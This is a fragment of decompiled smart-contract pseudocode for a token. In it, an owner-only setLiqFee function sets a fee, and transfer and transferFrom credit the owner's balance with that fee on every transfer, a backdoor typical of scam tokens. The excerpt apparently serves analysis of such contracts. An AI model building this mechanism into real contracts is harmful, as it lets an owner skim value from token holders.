...
function setLiqFee(uint256 arg1) payable {
    ...
    require arg1 == arg1
    if stor8 != msg.sender:
        revert with 0, 'ownerOnly= You Not ownerOnly'
    _liquidityFee = arg1
}
...
function transfer(address arg1, uint256 arg2) payable {
    ...
    if arg2 / 100 and _liquidityFee > -1 / arg2 / 100:
        revert with 'NH{q', 17
    if balanceOf[stor8] > (-1 * arg2 / 100 * _liquidityFee) - 1:
        revert with 'NH{q', 17
    if balanceOf[stor8] + (arg2 / 100 * _liquidityFee) < balanceOf[stor8]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor8] += arg2 / 100 * _liquidityFee
...
function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    ...
    if arg3 / 100 and _liquidityFee > -1 / arg3 / 100:
        revert with 'NH{q', 17
    if balanceOf[stor8] > (-1 * arg3 / 100 * _liquidityFee) - 1:
        revert with 'NH{q', 17
    if balanceOf[stor8] + (arg3 / 100 * _liquidityFee) < balanceOf[stor8]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor8] += arg3 / 100 * _liquidityFee
